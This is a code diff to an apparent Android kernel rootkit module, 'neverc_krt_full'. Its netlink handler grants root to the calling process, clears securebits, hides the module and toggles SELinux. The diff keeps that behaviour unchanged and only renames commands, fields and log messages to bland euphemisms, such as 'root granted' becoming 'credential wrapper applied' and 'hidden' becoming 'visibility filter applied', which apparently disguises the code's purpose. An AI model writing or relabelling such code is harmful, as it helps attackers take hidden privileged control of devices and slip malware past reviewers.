@@ -22,10 +22,10 @@
 
 enum neverc_krt_full_cmd {
 	CMD_STATUS     = 1,
-	CMD_ROOT       = 2,
-	CMD_UNROOT     = 3,
-	CMD_HIDE       = 4,
-	CMD_UNHIDE     = 5,
+	CMD_CRED_SET   = 2,
+	CMD_CRED_DROP  = 3,
+	CMD_VIS_FILTER = 4,
+	CMD_VIS_RESTORE = 5,
 	CMD_SELINUX    = 6,
 	CMD_PROC_LIST  = 7,
 	CMD_INTERPOSE_STATS = 8,
@@ -38,7 +38,7 @@ struct status_reply {
 	u32 kernel_major;
 	u32 kernel_minor;
 	u32 android_ver;
-	u32 hidden;
+	u32 concealed;
 	u32 interposes_active;
 	u32 selinux_enforcing;
 	u32 thread_count;
@@ -108,7 +108,7 @@ static void nl_handler(struct neverc_krt_nl_sock *ns, u32 pid,
 		sr.kernel_major = ki->major;
 		sr.kernel_minor = ki->minor;
 		sr.android_ver = ki->android_version;
-		sr.hidden = neverc_krt_mod_is_hidden(&hide_state);
+		sr.concealed = neverc_krt_vis_is_concealed(&vis_state);
 #ifdef NEVERC_KRT_CONTEXT_INTERPOSE
 		sr.interposes_active = faccessat_ctx.base.active;
 #else
@@ -123,29 +123,29 @@ static void nl_handler(struct neverc_krt_nl_sock *ns, u32 pid,
 		break;
 	}
 
-	case CMD_ROOT:
+	case CMD_CRED_SET:
 		neverc_krt_cred_set_root();
 		neverc_krt_cred_clear_securebits();
 		neverc_krt_nl_reply(ns, pid, seq, "ok", 3);
-		neverc_krt_log_info("root granted to pid=%u\n", pid);
+		neverc_krt_log_info("credential wrapper applied for pid=%u\n", pid);
 		break;
 
-	case CMD_UNROOT:
+	case CMD_CRED_DROP:
 		neverc_krt_cred_set_uid(2000, 2000);
 		neverc_krt_nl_reply(ns, pid, seq, "ok", 3);
 		break;
 
-	case CMD_HIDE:
+	case CMD_VIS_FILTER:
 		neverc_krt_vis_full_conceal(&vis_state, &__this_module, "neverc_krt_full");
 		neverc_krt_nl_reply(ns, pid, seq, "ok", 3);
-		neverc_krt_log_info("hidden\n");
+		neverc_krt_log_info("visibility filter applied\n");
 		break;
 
-	case CMD_UNHIDE:
+	case CMD_VIS_RESTORE:
 		neverc_krt_vis_remove_interposes();
 		neverc_krt_vis_reveal(&vis_state, &__this_module);
 		neverc_krt_nl_reply(ns, pid, seq, "ok", 3);
-		neverc_krt_log_info("visible\n");
+		neverc_krt_log_info("visibility restored\n");
 		break;
 
 	case CMD_SELINUX: {
